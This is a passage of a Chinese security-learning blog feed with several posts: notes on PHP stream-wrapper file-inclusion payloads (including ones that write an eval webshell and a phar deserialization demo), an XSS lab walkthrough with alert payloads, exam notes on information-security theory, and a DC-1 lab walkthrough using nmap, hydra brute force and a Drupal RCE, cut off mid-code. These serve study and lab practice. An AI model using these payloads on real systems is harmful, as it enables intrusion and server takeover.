class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br><span class="line"></span><br><span class="line">2、http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?phpfputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h2><ul><li>条件：<ul><li>allow_url_fopen:off/on</li><li>allow_url_include :off/on</li></ul></li><li>作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span><br><span class="line">压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</span><br><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br><span class="line"></span><br><span class="line">2、compress.bzip2://file.bz2</span><br><span class="line">压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</span><br><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br><span class="line"></span><br><span class="line">3、compress.zlib://file.gz</span><br><span class="line">压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</span><br><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h2><ul><li>条件：<ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul></li><li>作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</li><li>用法：<ul><li><code>data://text/plain,</code>  </li><li><code>data://text/plain;base64,</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">2、data://text/plain;base64,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><ul><li><p>phar:// — PHP 归档，将多个文件组合成一个文件</p></li><li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p></li><li><p>运用：</p><p><strong>1、绕过上传限制</strong></p><p>可以利于phar://绕过一些上传限制，多数情况下搭配文件包含使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造木马shell.php-&gt;(压缩)xxx.zip-&gt;(修改后缀)xxx.jpg-&gt;上传-&gt;phar://xxx.jpg/shell.php</span></span><br><span class="line"><span class="number">1</span>、构造木马 shell.php: </span><br><span class="line">    <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>、将shell.php压缩，并修改后缀名为jpg：xxx.<span class="title function_ invoke__">jpg</span>(实际是带有文件shell.php但修改了后缀名的压缩包)</span><br><span class="line"><span class="number">3</span>、上传xxx.jpg并配合文件包含解析木马（payload：<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>）：</span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>phar反序列化漏洞</strong></p><ul><li><p>（ps : 也是反序列化漏洞，但无需借助unserialize()函数）</p></li><li><p>PHP反序列化漏洞通常是<strong>借助unserialize()函数</strong> 但<strong>利用phar:// 伪协议</strong>也可以触发PHP反序列化漏洞： 1、phar文件以序列化的形式存储用户自定义的meta-data； 2、当使用phar://读取phar文件时，就会反序列化meta-data储存的信息</p></li><li><p><strong>利用条件</strong>：(ps:由此可以知道如何修复漏洞咯~) <code>可以上传phar文件</code> <code>有可用魔术方法</code> <code>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</code></p></li><li><p><strong>受影响的文件操作函数</strong>：(参考 zsx师傅<a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a>)可知： 除了<code>所有文件函数</code>，只要是函数的实现过程直接或间接调用了<code>php_stream_open_wrapper</code>的函数，都可能触发phar反序列化漏洞（具体看zsx师傅的博客，写的很明了~） <img src="https://i.loli.net/2021/02/25/MT25UaKWSXCAl9i.png" alt="源自创宇测试"></p></li><li><p>phar文件： 在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p><ul><li><code>php&gt;=5.3</code>：默认开启支持<code>Phar</code>，文件状态为只读(<code>phar.readonly=on</code>)，而且使用phar文件不需要任何配置。php使用phar://伪协议来解析phar文件的内容。 ps：需<code>php.ini</code>中令 <code>phar.readonly=off</code>并去掉其前面的分号<code>;</code>否则无法生成phar文件</li></ul></li><li><p>phar文件结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. stub</span><br><span class="line">phar文件的标志，必须以 xxx <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span> 结尾，否则phar不会识别此部分。xxx可以为自定义内容。</span><br><span class="line"><span class="number">2</span>. manifest</span><br><span class="line">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分会以序列化的形式存储用户自定义的meta-data，这里是漏洞利用的关键所在,正是因为meta-data是以序列化的形式存储</span><br><span class="line"><span class="number">3</span>. content</span><br><span class="line">被压缩文件的内容，通常情况下这里是可以随意输入的</span><br><span class="line"><span class="number">4</span>. <span class="title function_ invoke__">signature</span> (可空)</span><br><span class="line">签名，放在末尾。</span><br></pre></td></tr></table></figure></li><li>demo:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Phar create done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">#.phar文件，(后缀名必须为phar)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php  __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">#stub(1)</span></span><br><span class="line"><span class="comment">#检测图片头时，可以添加gif头来绕过：GIF89a</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;<span class="keyword">string</span> = <span class="string">&quot;bphar&quot;</span>;<span class="comment">#类的属性</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">#将自定义的meta-data存入manifest(2)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;bphar.txt&quot;</span>,<span class="string">&quot;bphar&quot;</span>); <span class="comment">#添加压缩文件(3)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">#签名自动计算(4)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化 (也就是phar文件中的反序列化部分)</p><ul><li>利用：<ol><li>上传phar文件，并借助phar://协议访问phar文件，从而将Meta-data中的内容反序列化</li><li>在创建时必须是phar后缀（$phar = new Phar(“exp.phar”); //.phar文件） 上传时为了绕过限制，则可以修改文件后缀、添加图片头从而达到上传的目的</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-lab通关小计</title>
      <link href="/posts/973d.html"/>
      <url>/posts/973d.html</url>
      
        <content type="html"><![CDATA[<h2 id="xss-lab通关小计"><a href="#xss-lab通关小计" class="headerlink" title="xss-lab通关小计"></a>xss-lab通关小计</h2><p>实际构造闭合，另外要对js有一定了解<br>常用测试语句：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><code>https://xssaq.com/yx/level1.php?name=test</code><br>name参数未过滤，参数值直接显示在页面中。  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>闭合input标签，构造<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//&gt;</code></p><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>value同2，但对部分特殊字符进行了转译，双引号被过滤了，后端使用了htmlspecialchars函数 <code>&lt;input name=&quot;keyword&quot; value=&quot;&amp;quot;&gt;&lt;script&gt;alert(&quot; xss&#39;)&amp;lt;=&quot;&quot; script&amp;gt;&#39;=&quot;&quot;&gt;</code></p><p>可以使用不带有尖括号的特殊字符进行尝试 如：’ onclick=’alert(1) （利用了HTML DOM 的onclick事件，点击后触发包含的命令）</p><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>同3，也有过滤，双引号没被过滤，构造闭合<code>&quot; onclick=&quot;alert(1)</code></p><h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机三级信息安全</title>
      <link href="/posts/a641.html"/>
      <url>/posts/a641.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机三级信息安全"><a href="#计算机三级信息安全" class="headerlink" title="计算机三级信息安全"></a>计算机三级信息安全</h1><h2 id="一、信息安全保障概述"><a href="#一、信息安全保障概述" class="headerlink" title="一、信息安全保障概述"></a>一、信息安全保障概述</h2><h3 id="1-1-信息安全保障背景"><a href="#1-1-信息安全保障背景" class="headerlink" title="1.1 信息安全保障背景"></a>1.1 信息安全保障背景</h3><p>信息：事物运行的状态和状态变化的方式</p><p>信息技术发展的三个阶段：电讯技术的发明、计算机技术的发展、互联网技术的发展</p><p>信息技术的影响</p><ol><li>信息技术的积极影响<ul><li>对社会发展</li><li>对科技进步</li><li>对人类生活</li></ul></li><li>信息技术的消极影响<ul><li>信息泛滥</li><li>信息污染</li><li>信息犯罪</li></ul></li></ol><h3 id="1-2-信息安全保障基础"><a href="#1-2-信息安全保障基础" class="headerlink" title="1.2 信息安全保障基础"></a>1.2 信息安全保障基础</h3><p>信息安全保障阶段：通信保密阶段、计算机安全阶段、信息安全保障阶段</p><p>信息安全保障的含义：运行系统的安全、系统信息的安全</p><p>1995年美国 信息安全保障体系（IA）：保护、监测、响应</p><p>信息安全基本属性：机密性、完整性、可用性、可控性、不可否认性</p><p>信息安全问题产生原因：内因（信息系统的复杂性）、外因（人为和环境威胁）</p><p>信息安全技术：</p><ul><li>核心基础安全技术：密码技术</li><li>安全基础设施技术：标识与认证技术，授权与访问控制技术</li><li>基础设施安全技术：主机系统安全技术，网络系统安全技术</li><li>应用安全技术：网络与系统安全攻击技术，网络与系统安全防护与响应技术，安全审计  与责任认定技术，恶意代码监测与防护技术</li><li>支撑安全技术：信息安全评测技术，信息安全管理技术</li></ul><h3 id="1-3-信息安全保障体系"><a href="#1-3-信息安全保障体系" class="headerlink" title="1.3 信息安全保障体系"></a>1.3 信息安全保障体系</h3><p>信息安全保障体系框架：</p><ul><li>生命周期：规划组织，开发采购，实施交付，运行维护，废弃</li><li>保障要素：技术，管理，工程，人员</li><li>安全特征：机密性，完整性，可用性</li></ul><p>P2DR（美国动态安全模型）：策略、防护、检测、响应 （核心是策略）<br>我国专家在1999年提出了更为完善的“保护-预警-监测-应急-恢复-反击”模型(即PWDRRC模型)</p><p>IATF（信息保障技术框架）提出的信息保障的核心思想是<code>纵深防御战略</code> （美国安全局NSA）</p><p>IATF 主要核心要素：人员、技术、操作</p><p>IATF 将信息系统的信息保障技术层面划分成了四个技术框架焦点域：网络和基础设施，区域边界、计算环境、支撑性基础设施。</p><h3 id="1-4-信息安全保障基本瞬间"><a href="#1-4-信息安全保障基本瞬间" class="headerlink" title="1.4 信息安全保障基本瞬间"></a>1.4 信息安全保障基本瞬间</h3><p>信息安全保障工作内容：确定安全需求、设计和实施安全方案、信息安全评测、信息安全监控与维护</p><p>安全技术评估方面：物理安全、网络层安全、主机系统层安全、应用层安全、数据安全</p><p><img src="https://img-blog.csdnimg.cn/img_convert/330abd7991720e796ad242bba5e7e142.png" alt="第一章"></p><h2 id="二、信息安全基础技术与原理"><a href="#二、信息安全基础技术与原理" class="headerlink" title="二、信息安全基础技术与原理"></a>二、信息安全基础技术与原理</h2><h3 id="2-1-密码技术"><a href="#2-1-密码技术" class="headerlink" title="2.1 密码技术"></a>2.1 密码技术</h3><p>对称密码与非对称密码</p><ol><li>对称密钥密码体制：发送方和接收方使用相同的密钥</li><li>非对称密钥密码体制：发送方和接收方使用不同的密钥</li></ol><p>对称密钥体制：</p><p>加密处理速度快、保密度高，密钥管理分发复杂代价高、数字签名困难</p><p>分组密码：一次加密一个明文分组：DES，IDEA，AES；</p><p>序列密码：一次加密一位或者一个字符：RC4，SEAL</p><p>加密方法：<br>代换法：单表代换密码，多表代换；<br>置换法</p><p>安全性：<br>攻击密码体制：穷举攻击法（对于密钥长度128位以上的密钥空间不再有效），密码分析学；</p><p>典型的密码攻击：</p><ul><li>唯密文攻击，已知明文攻击，</li><li>选择明文攻击（加密算法一般要能够抵抗选择明文攻击才认为是最安全的，分析方法：差分分析和线性分析），</li><li>选择密文攻击</li></ul><p>基本运算：异或，加，减，乘，查表</p><p>设计思想：扩散，混淆；</p><p>乘积迭代：乘积密码，常见的乘积密码是迭代密码，DES，AES</p><p>数据加密标准 DES：基于Feistel网络，3DES，有效密钥位数：56</p><p>国际数据加密算法 IDEA：利用128位密钥对64位的明文分组，经连续加密产生64位的密文分组</p><p>高级加密标准 AES：SP 网络</p><p>分组密码：电子密码本模式ECB，密码分组链模式CBC，密码反馈模式CFB，输出反馈模式OFB，计数模式CTF</p><p>非对称密码：</p><ul><li>基于难解问题设计密码是非对称密码设计的主要思想，NP问题NPC问题</li><li>克服密钥分配上的困难、易于实现数字签名、安全性高，降低了加解密效率</li></ul><p>RSA：基于大合数因式分解难得问题设计；既可用于加密，又可用于数字签名；目前应用最广泛</p><p>ElGamal：基于离散对数求解困难的问题设计</p><p>椭圆曲线密码 ECC：</p><ul><li>基于椭圆曲线离散对数求解困难的问题设计</li><li>通常采用对称密码体制实现数字加密，公钥密码体制实现密钥管理的混合加密机制</li></ul><p>哈希函数</p><ul><li>单向密码体制，从一个明文到密文的不可逆的映射，只有只有加密过程，没有解密过程</li><li>可将任意长度的输入经过变换后得到固定长度的输出（原消息的散列或消息摘要）</li></ul><p>应用：</p><ul><li>消息认证（基于哈希函数的消息认证码），</li><li>数字签名（对消息摘要进行数字签名口令的安全性，数据完整性）</li></ul><p>消息摘要算法 MD5：128 位</p><p>安全散列算法 SHA：160 位<br>SHA比MD5更安全，SHA比MD5速度慢了25%，SHA操作步骤较MD5更简单</p><p>数字签名<br>通过密码技术实现，其安全性取决于密码体制的安全程度</p><p>普通数字签名：RSA，ElGamal，椭圆曲线数字签名算法等</p><p>特殊数字签名：</p><p>盲签名，代理签名，群签名，不可否认签名，具有消息恢复功能得签名等</p><p>常对信息的摘要进行签名</p><p>美国数字签名标准 DSS：签名算法 DSA</p><p>应用：鉴权：重放攻击；完整性：同形攻击；不可抵赖</p><p>密钥管理<br>包括密钥的生成，存储，分配，启用与停用，<br>控制，更新，撤销与销毁等诸多方面密钥的分配与存储最为关键</p><p>借助加密，认证，签名，协议和公证等技术保证：</p><p>密钥的秘密性，完整性，真实性</p><p>密钥产生：</p><p>噪声源技术（基于力学，基于电子学，基于混沌理论的密钥产生技术）；主密钥，加密密钥，会话密钥的产生</p><p>密钥分配：</p><p>分配手段：人工分发（物理分发），密钥交换协议动态分发</p><p>密钥属性：秘密密钥分配，公开密钥分配</p><p>密钥分配技术：基于对称密码体制的密钥分配，基于公钥密码体制的密钥分配</p><p>密钥信息交换方式：人工密钥分发，给予中心密钥分发，基于认证密钥分发</p><p>人工密钥分发：主密钥</p><p>基于中心的密钥分发：利用公开密钥密码体制分配传统密码的密钥；</p><p>可信第三方：密钥分发中心KDC，密钥转换中心KTC；拉模型，推模型；<br>密钥交换协议：Diffie-Hellman算法<br>公开密钥分配：</p><p>公共发布；公用目录；公约授权：公钥管理机构；</p><p>公钥证书：证书管理机构 CA，目前最流行</p><p>私钥存储：</p><p> 用口令加密后存放在本地软盘或硬盘；<br> 存放在网络目录服务器中：私钥存储服务PKSS；<br> 智能卡存储；USB Key存储</p><p>认证技术<br>消息认证<br>消息加密：</p><p>整个消息的密文作为认证码</p><p>消息认证码（MAC）：</p><p>利用密钥对消息产生定长的值，并以该值作为认证码；基于DES的MAC算法</p><p>哈希函数：</p><p>将任意长的消息映射为定长的哈希值，并以该哈希值作为认证码</p><p>身份认证<br>身份认证系统：</p><p>认证服务器、认证系统客户端、认证设备<br>系统主要通过身份认证协议（单向认证协议和双向认证协议）和认证系统软硬件进行实现</p><p>认证手段：</p><p>1.静态密码方式</p><p>动态口令认证：动态短信密码，动态口令牌（卡）</p><p>USB Key认证：挑战/应答模式，基于PKI体系的认证模式</p><p>2.生物识别技术</p><p>认证协议：基于口令的认证协议，基于对称密码的认证，基于公钥密码的认证</p><p>访问控制技术<br>访问控制模型：</p><p>自主访问控制（DAC）：</p><p>访问矩阵模型：访问能力表（CL），访问控制表（ACL）；商业环境中，大多数系统，如主流操作系统、防火墙等</p><p>强制访问控制（DAC）：</p><p>安全标签：具有偏序关系的等级分类标签，非等级分类标签，比较主体和客体的安全标签等级，访问控制安全标签列表（ACSLL）；</p><p>访问级别：</p><p>最高秘密级，秘密级，机密级，无级别及；</p><p>Bell-Lapadula 模型：<br>只允许向下读、向上写，保证数据的保密性，Biba 不允许向下读、向上写，保护数据完整性；<br>Chinese Wall 模型：<br>多边安全系统中的模型，包括了 MAC 和 DAC 的属性</p><p>基于角色的访问控制（RBAC）：</p><p>要素：用户，角色，许可；面向企业，大型数据库的权限管理；<br>用户不能自主的将访问权限授权给别的用户；MAC基于多级安全需求，RBAC不是</p><p>访问控制技术<br>集中访问控制：</p><p>认证、授权、审计管理（AAA 管理）</p><p>拨号用户远程认证服务RADIUS：提供集中式AAA管理；客户端/服务器协议，运行在应用层，使用UDP协议；组合认证与授权服务</p><p>终端访问控制器访问控制系统 TACACS：TACACS+使用 TCP；<br>更复杂的认证步骤；分隔认证、授权、审计</p><p>Diameter：协议的实现和 RADIUS 类似，采用 TCP 协议，支持分布式审计</p><p>非集中式访问控制：</p><p>单点登录 SSO</p><p>Kerberos：</p><p>   使用最广泛的身份验证协议；引入可信的第三方。<br>   Kerberos验证服务器；能提供网络信息的保密性和完整性保障；支持双向的身份认证</p><p>SESAME：认证过程类似于 Kerberos.</p><p>RADIUS运行在UDP协议上，并且没有定义重传机制，而Diameter运行在可靠的传输协议TCP、SCTP之上。</p><p>Diameter 还支持窗口机制，每个会话方可以动态调整自己的接收窗口，以免发送超出对方处理能力的请求。RADIUS协议不支持失败恢复机制，而Diameter支持应用层确认，并且定义了失败恢复算法和相关的状态机，能够立即检测出传输错误。<br>RADIUS固有的C/S模式限制了它的进一步发展。</p><p>Diameter采用了peer-to-peer模式，peer的任何一端都可以发送消息以发起计费等功能或中断连接。<br>Diameter还支持认证和授权分离，重授权可以随时根据需求进行。<br>而RADIUS中认证与授权必须是成对出现的。</p><p>审计和监控技术<br>审计和监控基础<br>审计系统：</p><p>日志记录器：收集数据，系统调用Syslog收集数据；<br>分析器：分析数据；<br>通告器：通报结果</p><p>审计和监控技术<br>恶意行为监控：</p><p>主机监测：可监测的地址空间规模有限；<br>网络监测：蜜罐技术（软件honeyd），<br>蜜网（诱捕网络）：高交互蜜罐、低交互蜜罐、主机行为监视模块</p><p>网络信息内容审计方法：</p><p>网络舆情分析：舆情分析引擎、自动信息采集功能、数据清理功能；<br>技术：网络信息内容获取技术（嗅探技术）、网络内容还原分析技术；<br>模型：流水线模型、分段模型；<br>不良信息内容监控方法：网址、网页内容、图片过滤技术</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机三级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机</title>
      <link href="/posts/5951.html"/>
      <url>/posts/5951.html</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1靶机"><a href="#DC-1靶机" class="headerlink" title="DC-1靶机"></a>DC-1靶机</h1><h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-1,292/</span><br></pre></td></tr></table></figure><p>将网路模式改为net模式</p><h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><ul><li>nmap扫描网段与端口服务的探测</li><li>msfconsole使用</li><li>drupal cms漏洞利用</li><li>netcat反弹shell</li><li>mysql数据库渗透思路</li><li>suid提权</li></ul><hr><h2 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主机发现</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sn -n --min-rate 1000 192.168.101.0/24</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp-scan -l</span></span><br><span class="line">端口探测</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ports=$(nmap -p- -sS -n --min-rate=1000 -T4 192.168.101.132 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sV -n -p<span class="variable">$ports</span> -T4 -A 192.168.101.132 -oN nmap.txt</span></span><br></pre></td></tr></table></figure><p>发现22、80、111端口，尝试shh爆破(nmap也能爆破)</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/**rockyou**.txt -f -o hydra.txt -u</span></span><br></pre></td></tr></table></figure><p>发现ssh爆破失败，尝试80端口的web服务<br>网站就一登录页面，注册账户发现不能设置密码，提示拿到admin用户的权限，扫cms。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wahtweb http://192.168.101.132</span></span><br></pre></td></tr></table></figure><p>发现其cms为drupal，尝试drupal漏洞利用</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">searchsploit drupal</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">searchsploit -m php/webapps/xxxxx.rb</span></span><br></pre></td></tr></table></figure><p>发现drupal cms存在远程代码执行漏洞，尝试利用，成功获取webshell</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whomai</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">www-data</span></span><br></pre></td></tr></table></figure><p>开交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>发现有漏洞也可以直接用msf<br>使用2018年的漏洞吧，是个远程代码执行(代码审计现在真心看不懂，😔)<br><a href="https://www.exploit-db.com/exploits/44482">https://www.exploit-db.com/exploits/44482</a><br><a href="https://paper.seebug.org/567/">https://paper.seebug.org/567/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: \core\lib\Drupal\Core\Render\Renderer.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$elements</span>[<span class="string">&#x27;#pre_render&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$elements</span>[<span class="string">&#x27;#pre_render&#x27;</span>] <span class="keyword">as</span> <span class="variable">$callable</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$callable</span>) &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$callable</span>, <span class="string">&#x27;::&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$callable</span> = <span class="variable language_">$this</span>-&gt;controllerResolver-&gt;<span class="title function_ invoke__">getControllerFromDefinition</span>(<span class="variable">$callable</span>);</span><br><span class="line">      &#125;</span><br><span 